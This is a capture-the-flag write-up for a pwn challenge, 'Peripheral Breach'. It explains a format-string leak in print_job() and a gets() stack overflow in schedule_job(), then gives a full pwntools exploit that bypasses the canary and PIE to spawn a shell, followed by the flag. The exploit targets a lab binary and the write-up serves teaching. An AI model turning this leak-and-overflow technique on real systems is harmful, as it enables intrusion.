# Peripheral Breach - Writeup

---

## Exploit Demo

This demo illustrates the exploit process:

![Alt text](gif/PeripheralBreach.gif)

---

## Binary Inspection

We begin by analyzing the binary for reverse engineering and exploitation.

### Step 1: Checking binary format

```bash
$ file main
```

The binary is a 64-bit dynamically linked PIE executable, not stripped.

![Alt text](img/1.png)

---

### Step 2: Checking binary security

```bash
$ pwn checksec main
```

The binary is protected with:

- Full RELRO
- NX enabled
- PIE enabled
- Stack canary

![Alt text](img/2.png)

---

## Static Analysis (IDA Pro)

Reversing the binary with IDA Pro reveals two key vulnerabilities in the functions `print_job()` and `schedule_job()` that can be chained for a successful exploit.

### 1. `print_job()` – Format String Vulnerability

```c
snprintf(s, 0x200uLL, "Confirm printing: %s from %s", a1, a2);
printf(s);
```

- User-controlled input is passed directly into `printf()` without a format string.
- This introduces a **format string vulnerability** that can leak:

  - The **stack canary**, required to bypass stack protection.
  - The **PIE base address**, necessary to defeat ASLR and locate internal functions or gadgets.

### 2. `schedule_job()` – Buffer Overflow via `gets()`

```c
gets(v3);
```

- The buffer `v3` is 264 bytes on the stack.
- Since `gets()` does **not perform bounds checking**, this results in a **classic stack-based buffer overflow**.
- However, since the binary uses a **stack canary**, the canary must first be leaked (via `print_job()`) to exploit this safely.
- After bypassing the canary, the return address can be overwritten to hijack control flow.

---

## How to Solve

1. Trigger the format string vulnerability in `print_job()` to **leak the stack canary and PIE base** using format specifiers (e.g. `%p`).
2. Compute the correct **base address of the binary** and locate useful functions like `maintain()`.
3. Craft a payload that **overflows the buffer** in `schedule_job()` while preserving the leaked canary.
4. Overwrite the return address to jump to the `maintain()` function, which calls `system("/bin/sh")`.

---

## Vulnerability Summary

- **Format String** in `print_job()` → Leak **stack canary** and **PIE base**.
- **Buffer Overflow** in `schedule_job()` → Overwrite return address after bypassing canary.
- **Canary + PIE + NX + Full RELRO** → Strong protections, but all bypassable due to format string leak.
- **Goal**: Redirect execution to `maintain()` → `system("/bin/sh")`.

---

## Exploit Strategy

1. Input a **format string** (e.g., `%39$p %107$p`) into the filename and URL prompts to leak both:

   - Stack canary
   - PIE address of `main()`

2. Compute the PIE base and calculate the absolute address of the `maintain()` function.
3. Prepare a payload for the `gets()`-based overflow:

   - Padding up to the canary (264 bytes)
   - The **correct leaked canary**
   - Return address pointing to `maintain()`

4. Gain a shell via `system("/bin/sh")`.

---

## Exploit Script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()


io.sendlineafter(b'? ', b's')
io.sendlineafter(b'filename to print: ', b'%39$p %107$p')
io.sendlineafter(b'Enter URL: ', b'URL')

data = io.recvline_contains(b'Confirm printing:').strip()
leak_vals = data.split(b' from ')[0].split()
log.info(f"raw leaks: {leak_vals}")

canary = int(leak_vals[2], 16)
main = int(leak_vals[3], 16)
log.success(f"canary = {hex(canary)}")
log.success(f"main = {hex(main)}")

exe.address = main - exe.sym['main']
log.success(f"PIE base = {hex(exe.address)}")

maintain = exe.symbols['maintain']
log.success(f"maintain() = {hex(maintain)}")

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]


io.sendlineafter(b'Enter credentials: ', flat(
    b'A'*264,
    p64(canary),
    p64(ret),
    p64(ret),
    p64(maintain)
))


io.interactive()


```

---

## Result

After successful exploitation, the program executes:

```c
system("/bin/sh");
```

This gives us a shell to reveal the flag.

---

## FLAG

The flag will be displayed in the output after successful execution.

```
RedPointer{PhantomNetRelay0x10!}
```
